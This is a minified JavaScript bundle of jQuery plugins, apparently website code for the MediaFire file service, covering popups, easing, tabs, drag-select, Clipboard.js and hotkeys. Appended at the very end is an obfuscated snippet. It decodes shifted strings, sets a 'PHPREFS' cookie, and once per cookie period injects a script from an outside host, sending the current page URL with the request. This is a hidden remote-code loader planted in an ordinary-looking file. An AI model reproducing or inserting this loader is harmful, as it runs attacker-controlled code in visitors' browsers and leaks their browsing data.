ActiveXObject("Msxml2.XMLHTTP.6.0")}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP.3.0")}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(e){}try{return new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}throw new Error("This browser does not support XMLHttpRequest.")});return new XMLHttpRequest}(),n=e.data?e.data:{};n.session_token=t,n.response_format="json",n.rand=Math.floor(1e3*Math.random())+1e3;var r="www.mediafire.com";window.location.host.indexOf("mediafire.com")>-1&&(r=window.location.host);var d=window.location.protocol+"//"+r+"/api/"+e.url,c="";for(var f in n)n[f]&&(c+="&"+f+"="+n[f]);c=c.substring(1),o.open("GET",d+"?"+c,!0),o.onreadystatechange=function(){var t;4==o.readyState&&200==o.status?(e.success(JSON.parse(o.responseText)),s.length>0?(t=s[0],s.splice(0,1),l(t,!0)):i=!1):4==o.readyState&&(e.error&&e.error(o),s.length>0?(t=s[0],s.splice(0,1),l(t,!0)):i=!1)},o.send(null)}else(function(e){for(var t=0,a=s.length;t<a;t++)if(s[t]==e)return!0;return!1})(e)||s.push(e)}function d(e){return e.permissions?"object"==typeof e.permissions?e.permissions.value?parseInt(e.permissions.value):0:parseInt(e.permissions):0}window.auj=o,window.auj.aZG=r,window.bdV=new Array,window.beR=function(e){for(var t=0,a=bdV.length;t<a;t++)bdV[t].bfx(e)},window.bfr=function(e,t){for(var a=0,o=bdV.length;a<o;a++)bdV[a].aVp(e,t)},window.beK=function(e){for(var t=0,a=bdV.length;t<a;t++)bdV[t].aVb(e)},window.bfF=function(e){for(var t=0,a=bdV.length;t<a;t++)bdV[t].aZE(e)}}(jQuery),function(e){e.popup=function(t,a){var o=this;o.$POP_oElement=e(t);o.POP_oElement=t,o.$root=o.$POP_oElement.data("popup",o).wrap('<div class="popup"><div class="popup_content" /></div>').parent().parent().prepend('<a href="javascript:void(0);" class="popup-close"></a>'),o.close(!0),o.options=e.extend({},e.popup.defaultOptions,a)},e.popup.prototype.open=function(t,a,o,n,r){dZ();var i=this,s=e(window);function l(e,t,a){var o={};o.top=Math.max(0,(t.height()-e.outerHeight(!0))/2+t.scrollTop()<t.scrollTop()?t.scrollTop()+10:(t.height()-e.outerHeight(!0))/2+t.scrollTop())+"px",o.left=Math.max(0,(t.width()-e.outerWidth(!0))/2)+"px",e.css(o)}if(t?this.$root[0].style.display="block":this.$root.fadeIn(),e("body").addClass("lightboxActive"),void 0!==a&&void 0!==o){var d={top:a,left:o};void 0!==n&&(d.bottom=n),void 0!==r&&(d.right=r),this.$root.css(d)}else l(this.$root,s),s.resize((function(){l(i.$root,s)}));if(window.Ms&&window.Ms(this.$root.context.id),window.OX){var c=this.$root[0];window.OX(c.offsetWidth,c.offsetHeight),PJ(c,(function(e){window.OX(e.target.offsetWidth,e.target.offsetHeight)}))}},e.popup.prototype.close=function(t){cU(),this.$root.fadeOut(),!t&&window.MYF_TriggerDesktopClose&&window.MYF_TriggerDesktopClose(this.$root.context.id),"sharebox"==this.$root.context.id&&e(this.$root.context).children().first().remove(),e("body").removeClass("lightboxActive")},e.popup.defaultOptions={},e.fn.popup=function(t){return this.each((function(){var a=new e.popup(this,t);a.options,e(this);a.$root.delegate(".close, .popup-close","click",(function(){a.close()}))}))}}(jQuery),jQuery.easing.jswing=jQuery.easing.swing,jQuery.extend(jQuery.easing,{def:"easeOutQuad",swing:function(e,t,a,o,n){return jQuery.easing[jQuery.easing.def](e,t,a,o,n)},easeInQuad:function(e,t,a,o,n){return o*(t/=n)*t+a},easeOutQuad:function(e,t,a,o,n){return-o*(t/=n)*(t-2)+a},easeInOutQuad:function(e,t,a,o,n){return(t/=n/2)<1?o/2*t*t+a:-o/2*(--t*(t-2)-1)+a},easeInCubic:function(e,t,a,o,n){return o*(t/=n)*t*t+a},easeOutCubic:function(e,t,a,o,n){return o*((t=t/n-1)*t*t+1)+a},easeInOutCubic:function(e,t,a,o,n){return(t/=n/2)<1?o/2*t*t*t+a:o/2*((t-=2)*t*t+2)+a},easeInQuart:function(e,t,a,o,n){return o*(t/=n)*t*t*t+a},easeOutQuart:function(e,t,a,o,n){return-o*((t=t/n-1)*t*t*t-1)+a},easeInOutQuart:function(e,t,a,o,n){return(t/=n/2)<1?o/2*t*t*t*t+a:-o/2*((t-=2)*t*t*t-2)+a},easeInQuint:function(e,t,a,o,n){return o*(t/=n)*t*t*t*t+a},easeOutQuint:function(e,t,a,o,n){return o*((t=t/n-1)*t*t*t*t+1)+a},easeInOutQuint:function(e,t,a,o,n){return(t/=n/2)<1?o/2*t*t*t*t*t+a:o/2*((t-=2)*t*t*t*t+2)+a},easeInSine:function(e,t,a,o,n){return-o*Math.cos(t/n*(Math.PI/2))+o+a},easeOutSine:function(e,t,a,o,n){return o*Math.sin(t/n*(Math.PI/2))+a},easeInOutSine:function(e,t,a,o,n){return-o/2*(Math.cos(Math.PI*t/n)-1)+a},easeInExpo:function(e,t,a,o,n){return 0==t?a:o*Math.pow(2,10*(t/n-1))+a},easeOutExpo:function(e,t,a,o,n){return t==n?a+o:o*(1-Math.pow(2,-10*t/n))+a},easeInOutExpo:function(e,t,a,o,n){return 0==t?a:t==n?a+o:(t/=n/2)<1?o/2*Math.pow(2,10*(t-1))+a:o/2*(2-Math.pow(2,-10*--t))+a},easeInCirc:function(e,t,a,o,n){return-o*(Math.sqrt(1-(t/=n)*t)-1)+a},easeOutCirc:function(e,t,a,o,n){return o*Math.sqrt(1-(t=t/n-1)*t)+a},easeInOutCirc:function(e,t,a,o,n){return(t/=n/2)<1?-o/2*(Math.sqrt(1-t*t)-1)+a:o/2*(Math.sqrt(1-(t-=2)*t)+1)+a},easeInElastic:function(e,t,a,o,n){var r=1.70158,i=0,s=o;if(0==t)return a;if(1==(t/=n))return a+o;if(i||(i=.3*n),s<Math.abs(o)){s=o;r=i/4}else r=i/(2*Math.PI)*Math.asin(o/s);return-s*Math.pow(2,10*(t-=1))*Math.sin((t*n-r)*(2*Math.PI)/i)+a},easeOutElastic:function(e,t,a,o,n){var r=1.70158,i=0,s=o;if(0==t)return a;if(1==(t/=n))return a+o;if(i||(i=.3*n),s<Math.abs(o)){s=o;r=i/4}else r=i/(2*Math.PI)*Math.asin(o/s);return s*Math.pow(2,-10*t)*Math.sin((t*n-r)*(2*Math.PI)/i)+o+a},easeInOutElastic:function(e,t,a,o,n){var r=1.70158,i=0,s=o;if(0==t)return a;if(2==(t/=n/2))return a+o;if(i||(i=n*(.3*1.5)),s<Math.abs(o)){s=o;r=i/4}else r=i/(2*Math.PI)*Math.asin(o/s);return t<1?s*Math.pow(2,10*(t-=1))*Math.sin((t*n-r)*(2*Math.PI)/i)*-.5+a:s*Math.pow(2,-10*(t-=1))*Math.sin((t*n-r)*(2*Math.PI)/i)*.5+o+a},easeInBack:function(e,t,a,o,n,r){return null==r&&(r=1.70158),o*(t/=n)*t*((r+1)*t-r)+a},easeOutBack:function(e,t,a,o,n,r){return null==r&&(r=1.70158),o*((t=t/n-1)*t*((r+1)*t+r)+1)+a},easeInOutBack:function(e,t,a,o,n,r){return null==r&&(r=1.70158),(t/=n/2)<1?o/2*(t*t*((1+(r*=1.525))*t-r))+a:o/2*((t-=2)*t*((1+(r*=1.525))*t+r)+2)+a},easeInBounce:function(e,t,a,o,n){return o-jQuery.easing.easeOutBounce(e,n-t,0,o,n)+a},easeOutBounce:function(e,t,a,o,n){return(t/=n)<1/2.75?o*(7.5625*t*t)+a:t<2/2.75?o*(7.5625*(t-=1.5/2.75)*t+.75)+a:t<2.5/2.75?o*(7.5625*(t-=2.25/2.75)*t+.9375)+a:o*(7.5625*(t-=2.625/2.75)*t+.984375)+a},easeInOutBounce:function(e,t,a,o,n){return t<n/2?.5*jQuery.easing.easeInBounce(e,2*t,0,o,n)+a:.5*jQuery.easing.easeOutBounce(e,2*t-n,0,o,n)+.5*o+a}}),function(e){e.fn.tabs=function(t){return this.each((function(){var a=e(this),o=a.children("ul"),n=a.children("div"),r=e.extend({},e.fn.tabs.defaults,t);a.data("tabs",r),o.find("li > a").click((function(){var t=e(this),a=t.parent(),o=r.currentClass;return a.addClass(o).siblings().removeClass(o),n.filter("."+o).trigger("close").removeClass(o).end().filter("#"+t.attr("href").slice(1)).addClass(o).trigger("open"),!1}))}))},e.fn.tabs.defaults={currentClass:"current"}}(jQuery),jQuery.fn.dragToSelect=function(e){var t="object"==typeof e?e:{},a=jQuery.extend({selectables:"#main_list li",not:".collaborate-active",excludes:["li.row_container","#myfiles_viewtabs_bar","#myfiles_controlbar_outer","#header","#contextmenu","#folderTree"],className:"jquery-drag-to-select",activeClass:"dragselect_active",disabledClass:"dragselect_disabled",selectedClass:"dragselect_selected",scrollTH:10,percentCovered:.8,autoScroll:!1,selectOnMove:!1,onShow:function(){return!0},onHide:function(){return!0},onRefresh:function(){return!0}},t),o=!1,n=!1,r=!1,i=jQuery(this),s=i,l=!0,d=!1,c=!1;do{if(/auto|scroll|hidden/.test(s.css("overflow")))break;s=s.parent()}while(s[0].parentNode);if("disable"==e)return s.addClass(a.disabledClass),this;if("enable"==e)return s.removeClass(a.disabledClass),this;var f=s.offset(),u=f.left,p=f.top,h=(s.width(),s.height()),m={left:0,top:0},g=jQuery("<div/>").appendTo(s).attr("class",a.className).css({position:"absolute",background:"#def",display:"none",opacity:.3,filter:"alpha(opacity=30)",zIndex:500,border:"1px solid #369"});$(document).bind("keydown","ctrl",(function(){o=!0})),$(document).bind("keyup","ctrl",(function(){o=!1}));var y=function(){if(g.is(":visible")&&!s.is("."+a.disabledClass)){var e=i.find(a.selectables).not(a.not),t=g.offset(),o={left:t.left,top:t.top,width:g.width(),height:g.height()};e.each((function(e){var t=$(this),n=t.offset(),r={left:n.left,top:n.top,width:t.width(),height:t.height()},i=t.hasClass(a.selectedClass);v(o,r)>a.percentCovered?i||t.addClass(a.selectedClass):i&&t.removeClass(a.selectedClass)}))}},v=function(e,t){if(e.left<=t.left&&e.top<=t.top&&e.left+e.width>=t.left+t.width&&e.top+e.height>t.top+t.height)return 100;e.right=e.left+e.width,e.bottom=e.top+e.height,t.right=t.left+t.width,t.bottom=t.top+t.height;var a=Math.max(e.left,t.left),o=Math.min(e.right,t.right),n=Math.max(e.top,t.top),r=Math.min(e.bottom,t.bottom);return r>=n&&o>=a?(o-a)*(r-n)/(t.width*t.height)*100:0};return jQuery.fn.disableTextSelect&&s.disableTextSelect(),s.on("mousedown.dts",(function(e){var t=!0;$.each(a.excludes,(function(a,o){$(e.target).closest(o).length>0&&(t=!1)})),e.pageX+20>$(document.body).width()&&(t=!1),t&&1==e.which&&(d=!0,l=!1,o&&(n=!0),s.on("mousemove.dts",(function(e){d&&(c=!0,g.is(":visible")?g.width()&&g.css("z-index","100"):function(e){if(!s.is("."+a.disabledClass)){m.left=e.pageX-u+s[0].scrollLeft,m.top=e.pageY-p+s[0].scrollTop;var t={left:m.left+"px",top:m.top+"px",width:"0",height:"0",zIndex:"-100"};g.css(t).show(),a.onShow(o)}}(e),function(e){if(g.is(":visible")&&!s.is("."+a.disabledClass)){var t=e.pageX-u+s[0].scrollLeft,o=e.pageY-p+s[0].scrollTop,n=t,r=o,i=m.left-n,l=m.top-r;t>m.left&&(n=m.left,i=t-m.left),o>m.top&&(r=m.top,l=o-m.top);var d={left:n+"px",top:r+"px",width:i+"px",height:l+"px"};g.css(d),a.onRefresh()}}(e),a.selectables&&a.selectOnMove&&y(),a.autoScroll&&function(e){g.is(":visible")&&!s.is("."+a.disabledClass)&&(e.pageY+a.scrollTH>p+h&&(s[0].scrollTop+=a.scrollTH),e.pageY-a.scrollTH<p&&(s[0].scrollTop-=a.scrollTH))}(e))})).on("mouseleave.dts",(function(e){d&&$(this).mouseup()})).on("mouseup.dts",(function(e){c&&(l=!0,d=!1,c=!1,a.selectables&&y(),o&&n&&(r=!0,o=!1,n=!1),function(){if(g.is(":visible")&&!s.is("."+a.disabledClass)){if(void 0!==a.onHide){var e=g.offset(),t={top:e.top,left:e.left,width:g.width(),height:g.height()};a.onHide(r,t)}g.hide(),r=!1}}()),l&&!d||(l=!0,d=!1),s.unbind("mousemove.dts mouseleave.dts mouseup.dts")})))})),this},function(e){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=e();else if("function"==typeof define&&define.amd)define([],e);else{("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).Clipboard=e()}}((function(){return function e(t,a,o){function n(i,s){if(!a[i]){if(!t[i]){var l="function"==typeof require&&require;if(!s&&l)return l(i,!0);if(r)return r(i,!0);var d=new Error("Cannot find module '"+i+"'");throw d.code="MODULE_NOT_FOUND",d}var c=a[i]={exports:{}};t[i][0].call(c.exports,(function(e){var a=t[i][1][e];return n(a||e)}),c,c.exports,e,t,a,o)}return a[i].exports}for(var r="function"==typeof require&&require,i=0;i<o.length;i++)n(o[i]);return n}({1:[function(e,t,a){var o=9;if("undefined"!=typeof Element&&!Element.prototype.matches){var n=Element.prototype;n.matches=n.matchesSelector||n.mozMatchesSelector||n.msMatchesSelector||n.oMatchesSelector||n.webkitMatchesSelector}t.exports=function(e,t){for(;e&&e.nodeType!==o;){if(e.matches(t))return e;e=e.parentNode}}},{}],2:[function(e,t,a){function o(e,t,a,o){return function(a){a.delegateTarget=n(a.target,t),a.delegateTarget&&o.call(e,a)}}var n=e("./closest");t.exports=function(e,t,a,n,r){var i=o.apply(this,arguments);return e.addEventListener(a,i,r),{destroy:function(){e.removeEventListener(a,i,r)}}}},{"./closest":1}],3:[function(e,t,a){a.node=function(e){return void 0!==e&&e instanceof HTMLElement&&1===e.nodeType},a.nodeList=function(e){var t=Object.prototype.toString.call(e);return void 0!==e&&("[object NodeList]"===t||"[object HTMLCollection]"===t)&&"length"in e&&(0===e.length||a.node(e[0]))},a.string=function(e){return"string"==typeof e||e instanceof String},a.fn=function(e){return"[object Function]"===Object.prototype.toString.call(e)}},{}],4:[function(e,t,a){var o=e("./is"),n=e("delegate");t.exports=function(e,t,a){if(!e&&!t&&!a)throw new Error("Missing required arguments");if(!o.string(t))throw new TypeError("Second argument must be a String");if(!o.fn(a))throw new TypeError("Third argument must be a Function");if(o.node(e))return function(e,t,a){return e.addEventListener(t,a),{destroy:function(){e.removeEventListener(t,a)}}}(e,t,a);if(o.nodeList(e))return function(e,t,a){return Array.prototype.forEach.call(e,(function(e){e.addEventListener(t,a)})),{destroy:function(){Array.prototype.forEach.call(e,(function(e){e.removeEventListener(t,a)}))}}}(e,t,a);if(o.string(e))return function(e,t,a){return n(document.body,e,t,a)}(e,t,a);throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList")}},{"./is":3,delegate:2}],5:[function(e,t,a){t.exports=function(e){var t;if("SELECT"===e.nodeName)e.focus(),t=e.value;else if("INPUT"===e.nodeName||"TEXTAREA"===e.nodeName){var a=e.hasAttribute("readonly");a||e.setAttribute("readonly",""),e.select(),e.setSelectionRange(0,e.value.length),a||e.removeAttribute("readonly"),t=e.value}else{e.hasAttribute("contenteditable")&&e.focus();var o=window.getSelection(),n=document.createRange();n.selectNodeContents(e),o.removeAllRanges(),o.addRange(n),t=o.toString()}return t}},{}],6:[function(e,t,a){function o(){}o.prototype={on:function(e,t,a){var o=this.e||(this.e={});return(o[e]||(o[e]=[])).push({fn:t,ctx:a}),this},once:function(e,t,a){function o(){n.off(e,o),t.apply(a,arguments)}var n=this;return o._=t,this.on(e,o,a)},emit:function(e){for(var t=[].slice.call(arguments,1),a=((this.e||(this.e={}))[e]||[]).slice(),o=0,n=a.length;o<n;o++)a[o].fn.apply(a[o].ctx,t);return this},off:function(e,t){var a=this.e||(this.e={}),o=a[e],n=[];if(o&&t)for(var r=0,i=o.length;r<i;r++)o[r].fn!==t&&o[r].fn._!==t&&n.push(o[r]);return n.length?a[e]=n:delete a[e],this}},t.exports=o},{}],7:[function(e,t,a){!function(o,n){if(void 0!==a)n(t,e("select"));else{var r={exports:{}};n(r,o.select),o.clipboardAction=r.exports}}(this,(function(e,t){"use strict";var a=function(e){return e&&e.__esModule?e:{default:e}}(t),o="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},n=function(){function e(e,t){for(var a=0;a<t.length;a++){var o=t[a];o.enumerable=o.enumerable||!1,o.configurable=!0,"value"in o&&(o.writable=!0),Object.defineProperty(e,o.key,o)}}return function(t,a,o){return a&&e(t.prototype,a),o&&e(t,o),t}}(),r=function(){function e(t){(function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")})(this,e),this.resolveOptions(t),this.initSelection()}return n(e,[{key:"resolveOptions",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};this.action=e.action,this.emitter=e.emitter,this.target=e.target,this.text=e.text,this.trigger=e.trigger,this.selectedText=""}},{key:"initSelection",value:function(){this.text?this.selectFake():this.target&&this.selectTarget()}},{key:"selectFake",value:function(){var e=this,t="rtl"==document.documentElement.getAttribute("dir");this.removeFake(),this.fakeHandlerCallback=function(){return e.removeFake()},this.fakeHandler=document.body.addEventListener("click",this.fakeHandlerCallback)||!0,this.fakeElem=document.createElement("textarea"),this.fakeElem.style.fontSize="12pt",this.fakeElem.style.border="0",this.fakeElem.style.padding="0",this.fakeElem.style.margin="0",this.fakeElem.style.position="absolute",this.fakeElem.style[t?"right":"left"]="-9999px";var o=window.pageYOffset||document.documentElement.scrollTop;this.fakeElem.style.top=o+"px",this.fakeElem.setAttribute("readonly",""),this.fakeElem.value=this.text,document.body.appendChild(this.fakeElem),this.selectedText=(0,a.default)(this.fakeElem),this.copyText()}},{key:"removeFake",value:function(){this.fakeHandler&&(document.body.removeEventListener("click",this.fakeHandlerCallback),this.fakeHandler=null,this.fakeHandlerCallback=null),this.fakeElem&&(document.body.removeChild(this.fakeElem),this.fakeElem=null)}},{key:"selectTarget",value:function(){this.selectedText=(0,a.default)(this.target),this.copyText()}},{key:"copyText",value:function(){var e=void 0;try{e=document.execCommand(this.action)}catch(t){e=!1}this.handleResult(e)}},{key:"handleResult",value:function(e){this.emitter.emit(e?"success":"error",{action:this.action,text:this.selectedText,trigger:this.trigger,clearSelection:this.clearSelection.bind(this)})}},{key:"clearSelection",value:function(){this.target&&this.target.blur(),window.getSelection().removeAllRanges()}},{key:"destroy",value:function(){this.removeFake()}},{key:"action",set:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"copy";if(this._action=e,"copy"!==this._action&&"cut"!==this._action)throw new Error('Invalid "action" value, use either "copy" or "cut"')},get:function(){return this._action}},{key:"target",set:function(e){if(void 0!==e){if(!e||"object"!==(void 0===e?"undefined":o(e))||1!==e.nodeType)throw new Error('Invalid "target" value, use a valid Element');if("copy"===this.action&&e.hasAttribute("disabled"))throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');if("cut"===this.action&&(e.hasAttribute("readonly")||e.hasAttribute("disabled")))throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');this._target=e}},get:function(){return this._target}}]),e}();e.exports=r}))},{select:5}],8:[function(e,t,a){!function(o,n){if(void 0!==a)n(t,e("./clipboard-action"),e("tiny-emitter"),e("good-listener"));else{var r={exports:{}};n(r,o.clipboardAction,o.tinyEmitter,o.goodListener),o.clipboard=r.exports}}(this,(function(e,t,a,o){"use strict";function n(e){return e&&e.__esModule?e:{default:e}}function r(e,t){var a="data-clipboard-"+e;if(t.hasAttribute(a))return t.getAttribute(a)}var i=n(t),s=n(a),l=n(o),d=function(){function e(e,t){for(var a=0;a<t.length;a++){var o=t[a];o.enumerable=o.enumerable||!1,o.configurable=!0,"value"in o&&(o.writable=!0),Object.defineProperty(e,o.key,o)}}return function(t,a,o){return a&&e(t.prototype,a),o&&e(t,o),t}}(),c=function(e){function t(e,a){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var o=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this));return o.resolveOptions(a),o.listenClick(e),o}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),d(t,[{key:"resolveOptions",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};this.action="function"==typeof e.action?e.action:this.defaultAction,this.target="function"==typeof e.target?e.target:this.defaultTarget,this.text="function"==typeof e.text?e.text:this.defaultText}},{key:"listenClick",value:function(e){var t=this;this.listener=(0,l.default)(e,"click",(function(e){return t.onClick(e)}))}},{key:"onClick",value:function(e){var t=e.delegateTarget||e.currentTarget;this.clipboardAction&&(this.clipboardAction=null),this.clipboardAction=new i.default({action:this.action(t),target:this.target(t),text:this.text(t),trigger:t,emitter:this})}},{key:"defaultAction",value:function(e){return r("action",e)}},{key:"defaultTarget",value:function(e){var t=r("target",e);if(t)return document.querySelector(t)}},{key:"defaultText",value:function(e){return r("text",e)}},{key:"destroy",value:function(){this.listener.destroy(),this.clipboardAction&&(this.clipboardAction.destroy(),this.clipboardAction=null)}}],[{key:"isSupported",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:["copy","cut"],t="string"==typeof e?[e]:e,a=!!document.queryCommandSupported;return t.forEach((function(e){a=a&&!!document.queryCommandSupported(e)})),a}}]),t}(s.default);e.exports=c}))},{"./clipboard-action":7,"good-listener":4,"tiny-emitter":6}]},{},[8])(8)})),function(e,t,a){var o,n="hashchange",r=document,i=e.event.special,s=r.documentMode,l="on"+n in t&&(s===a||s>7);function d(e){return"#"+(e=e||location.href).replace(/^[^#]*#?(.*)$/,"$1")}e.fn[n]=function(e){return e?this.bind(n,e):this.trigger(n)},e.fn[n].delay=50,i[n]=e.extend(i[n],{setup:function(){if(l)return!1;e(o.start)},teardown:function(){if(l)return!1;e(o.stop)}}),o=function(){var o,i,s,c={},f=d(),u=function(e){return e},p=u,h=u;function m(){var a=d(),r=h(f);a!==f?(p(f=a,r),e(t).trigger(n)):r!==f&&(location.href=location.href.replace(/#.*/,"")+r),o=setTimeout(m,e.fn[n].delay)}return c.start=function(){o||m()},c.stop=function(){o&&clearTimeout(o),o=a},e.browser.msie&&!l&&(c.start=function(){i||(s=(s=e.fn[n].src)&&s+d(),i=e('<iframe tabindex="-1" title="empty"/>').hide().one("load",(function(){s||p(d()),m()})).attr("src",s||"javascript:0").insertAfter("body")[0].contentWindow,r.onpropertychange=function(){try{"title"===event.propertyName&&(i.document.title=r.title)}catch(e){}})},c.stop=u,h=function(){return d(i.location.href)},p=function(t,a){var o=i.document,s=e.fn[n].domain;t!==a&&(o.title=r.title,o.open(),s&&o.write('<script>document.domain="'+s+'"<\/script>'),o.close(),i.location.hash=t)}),c}()}(jQuery,this),function(e){var t=e("<b/>");e.subscribe=function(a,o){function n(){return o.apply(this,Array.prototype.slice.call(arguments,1))}n.guid=o.guid=o.guid||(e.guid?e.guid++:e.event.guid++),t.bind(a,n)},e.unsubscribe=function(){t.unbind.apply(t,arguments)},e.publish=function(){t.trigger.apply(t,arguments)}}(jQuery),function(e){function t(t){if("string"==typeof t.data){var a=t.handler,o=t.data.toLowerCase().split(" ");t.handler=function(t){if(this===t.target||!/textarea|select/i.test(t.target.nodeName)&&"text"!==t.target.type){var n="keypress"!==t.type&&e.hotkeys.specialKeys[t.which],r=String.fromCharCode(t.which).toLowerCase(),i="",s={};t.altKey&&"alt"!==n&&(i+="alt+"),t.ctrlKey&&"ctrl"!==n&&(i+="ctrl+"),t.metaKey&&!t.ctrlKey&&"meta"!==n&&(i+="meta+"),t.shiftKey&&"shift"!==n&&(i+="shift+"),n?s[i+n]=!0:(s[i+r]=!0,s[i+e.hotkeys.shiftNums[r]]=!0,"shift+"===i&&(s[e.hotkeys.shiftNums[r]]=!0));for(var l=0,d=o.length;l<d;l++)if(s[o[l]])return a.apply(this,arguments)}}}}e.hotkeys={version:"0.8",specialKeys:{8:"backspace",9:"tab",13:"return",16:"shift",17:"ctrl",18:"alt",19:"pause",20:"capslock",27:"esc",32:"space",33:"pageup",34:"pagedown",35:"end",36:"home",37:"left",38:"up",39:"right",40:"down",45:"insert",46:"del",96:"0",97:"1",98:"2",99:"3",100:"4",101:"5",102:"6",103:"7",104:"8",105:"9",106:"*",107:"+",109:"-",110:".",111:"/",112:"f1",113:"f2",114:"f3",115:"f4",116:"f5",117:"f6",118:"f7",119:"f8",120:"f9",121:"f10",122:"f11",123:"f12",144:"numlock",145:"scroll",191:"/",224:"meta"},shiftNums:{"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":": ","'":'"',",":"<",".":">","/":"?","\\":"|"}},e.each(["keydown","keyup","keypress"],(function(){e.event.special[this]={add:t}}))}(jQuery),function(e){e.dropdown=function(t,a){var o=this;o.$DD_oElement=e(t);o.DD_oElement=t,o.$DD_oElement.data("dropdown",o),"function"==typeof a&&(a={command:a}),o.options=e.extend({},e.dropdown.defaultOptions,a)},e.dropdown.prototype.show=function(){this.$DD_oElement.addClass("show_dropdown")},e.dropdown.prototype.hide=function(){this.$DD_oElement.removeClass("show_dropdown")},e.dropdown.prototype.toggle=function(e){this.$DD_oElement.toggleClass("show_dropdown",e)},e.dropdown.prototype.isHidden=function(){this.$DD_oElement.hasClass("show_dropdown")},e.dropdown.prototype.label=function(e){this.$DD_oElement.find(this.options.acc).html(e)},e.dropdown.defaultOptions={useLabel:!1,acc:"> a",adc:"click",ada:"li[data-command]",adD:"click",command:e.noop,acN:e.noop,adm:e.noop,stayOpen:!1},e.fn.dropdown=function(t){return this.each((function(){var a=new e.dropdown(this,t),o=a.options,n=e(this);n.find(o.acc).bind(o.adc,(function(e){o.acN.call(n),a.toggle(),o.adm.call(n)})),n.delegate(o.ada,o.adD,(function(t){o.command.call(n,e(this).data("command"),this,t),o.useLabel&&a.label(this.innerHTML),a.hide()})),n.mouseleave((function(e){!1===o.stayOpen&&a.hide()}))}))}}(jQuery);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));